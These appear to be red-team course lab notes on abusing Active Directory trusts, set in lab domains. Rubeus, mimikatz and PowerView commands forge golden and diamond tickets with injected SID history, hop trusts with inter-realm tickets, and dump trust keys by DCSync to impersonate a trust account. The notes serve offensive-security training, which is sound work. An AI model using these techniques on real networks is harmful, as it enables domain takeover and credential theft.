# Forest and Domain Trusts

A trust relationship enables users in one domain to authenticate and access resources in another domain, by allowing authentication traffic to flow between them using referrals. When a user requests access to a resource outside of the domain, their KDC will return a referral ticket pointing to the KDC of the target domain. The user's TGT is encrypted using an inter-realm trust key (rather than the local krbtgt), often called an inter-realm TGT. The foreign domain decrypts this ticket, recovers the user's TGT and decides whether they should be granted access. Trusts can be:

* **One-way** allows principals in the trusted domain to access resources in the trusting domain, but not vice versa.
* **Two-way** allows users in each domain to access resources in the other.
* **Transitive** is a trust that can be chained, e.g. (domain) A trusts B and B trusts C, then A trusts C implicitly.
* **Intransitive** is trust is not implied.

The direction of trust is the opposite to the direction of access.

## Parent/Child

When a child domain is added to a forest, it automatically creates a transitive, two-way trust with its parent. (In the lab: dev.cyberbotic.io is a child domain of cyberbotic.io.)

    beacon> getuid
    [*] You are DEV\bfarmer
    beacon> powershell Get-DomainTrust
    SourceName      : dev.cyberbotic.io    // current domain
    TargetName      : cyberbotic.io        // foreign domain
    TrustDirection  : Bidirectional

If we have Domain Admin in the child, we can also gain Domain Admin privileges in the parent using a TGT with the SID History attribute (supports migrations, moving users between domains). To preserve access to resources in the "old" domain, the user's previous SID would be added to their SID History. When creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent. This can be achieved using either a Golden or Diamond Ticket:

### Golden Ticket

The only new info required from before is the SID of a target group in the parent domain:

    beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
    objectsid                                   
    S-1-5-21-2594061375-675613155-814674916-512
    beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name
    Name              
    dc-1.cyberbotic.io

    PS C:\Users\Attacker> Rubeus.exe golden /aes256:51d7f... /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-... /sids:S-1-5-... /nowrap

Then import it into a logon session and use it to access the parent DC:

    beacon> run klist
    beacon> ls \\dc-1.cyberbotic.io\c$

### Diamond Ticket

The Rubeus diamond command also has a /sids parameter, with which we can supply the extra SIDs we want in our ticket.

    beacon> execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-... /krbkey:51d7f... /nowrap

If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly due to transitive trust.

Other means do not require DA in the child. kerberoast and ASREProast across domain trusts, which may lead to privileged credential disclosure. In the lab, principals in CYBER can be granted access to resources in DEV, there may be instances where they are accessing machines we have compromised. If they interact with a machine with unconstrained delegation, we can capture their TGTs. If they're on a machine interactively, such as RDP, we can impersonate them just like any other user.

## One-Way Inbound

In lab: dev.cyberbotic.io also has a one-way inbound trust with dev-studio.com:

    beacon> powershell Get-DomainTrust
    SourceName      : dev.cyberbotic.io
    TargetName      : dev-studio.com
    TrustDirection  : Inbound

Because the trust is inbound from attacker perspective, it means that principals in our domain can be granted access to resources in the foreign domain. We can enumerate the foreign domain across the trust:

    beacon> powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
    dnshostname      
    dc.dev-studio.com

Get-DomainForeignGroupMember will enumerate any groups that contain users outside of its domain and return its members:

    beacon> powershell Get-DomainForeignGroupMember -Domain dev-studio.com

Output shows a member of the domain's built-in Administrators group is not part of dev-studio.com. The MemberName field contains a SID that can be resolved in our current domain:

    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
    DEV\Studio Admins

This means that members of DEV\Studio Admins are also members of the built-in Admin group of dev-studio.com and therefore inherit LA to dc.dev-studio.com.

To hop this trust, need to impersonate a member of this Studio Admins domain group:

    beacon> powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
    MemberName
    nlamb

To hop a domain trust using Kerberos, get an inter-realm key. 

1: Obtain a TGT for the target user (using asktgt with their AES256 hash):

    beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779f... /nowrap

2: Use the TGT to request a referral ticket from the current domain to the target domain:

    beacon> execute-assembly Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj... /nowrap

(this inter-realm ticket is an rc4_hmac though our TGT was aes256_cts_hmac_sha1; default configuration unless AES has been specifically configured on the trust, so not necessarily bad OPSEC.)

3: Use this inter-realm ticket to request TGS's in the target domain; requesting a ticket for CIFS:

    beacon> execute-assembly Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz... /nowrap
    beacon> run klist
    beacon> ls \\dc.dev-studio.com\c$

## One-Way Outbound

If (domain) A trusts B, users in B can access resources in A; but users in A should not be able to access resources in B.In lab, an outbound trust exists between cyberbotic.io and msp.org. The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).

DEV has a trust with CYBER, so we can query the trusts that it has by adding the -Domain parameter:

    beacon> getuid
    [*] You are DEV\bfarmer
    beacon> powershell Get-DomainTrust -Domain cyberbotic.io
    SourceName      : cyberbotic.io
    TargetName      : msp.org
    TrustDirection  : Outbound

Can still partially exploit this trust and obtain "domain user" access from CYBER to MSP with the shared credential for the trust. Both domains in a trust relationship store a shared password (auto-changed every 30 days) in a Trusted Domain Object (TDO). TDOs are stored in the system container and can be read via LDAP.  Here the DC in CYBER has two TDOs for its trusts with DEV and MSP:

    beacon> execute-assembly ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

    [*] TOTAL NUMBER OF SEARCH RESULTS: 2...

Can move laterally to the DC itself and dump from memory (BUT involves memory patching, which is very risky on a DC):

    beacon> run hostname
    dc-1
    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    beacon> mimikatz lsadump::trust /patch

OR use DCSync with the TDO's GUID:

    beacon> powershell Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
    beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
    ... [ Out ] MSP.ORG -> CYBERBOTIC.IO...    /// new PW
    ... [Out-1] MSP.ORG -> CYBERBOTIC.IO...    /// old PW

In most cases, the current [Out] key is the one to get. There is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain (e.g. if we get all the user accounts in the DEV domain, we'll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts).

    beacon> execute-assembly ADSearch.exe --search "(objectCategory=user)"
    [*] TOTAL NUMBER OF SEARCH RESULTS: 11...
    [+] cn : CYBER$
	[+] cn : STUDIO$

The MSP domain will have a trust account called CYBER$, even though we can't enumerate across the trust to confirm it. This is the account we must impersonate to request Kerberos tickets across the trust. RC4 tickets are used by default across trusts.

    beacon> execute-assembly Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2... /nowrap

This TGT can now be used to interact with the domain.

    beacon> run klist
    beacon> powershell Get-Domain -Domain msp.org
    Forest                  : msp.org
    DomainControllers       : {ad.msp.org}
    Children                : {}
    DomainMode              : Unknown
    DomainModeLevel         : 7
    Parent                  : 
    PdcRoleOwner            : ad.msp.org
    RidRoleOwner            : ad.msp.org
    InfrastructureRoleOwner : ad.msp.org
    Name                    : msp.org

This account is not a domain admin, but can use many abuse primitives across the trust to elevate privileges (e.g. kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates).

Try to find a way to get DA in this forest.

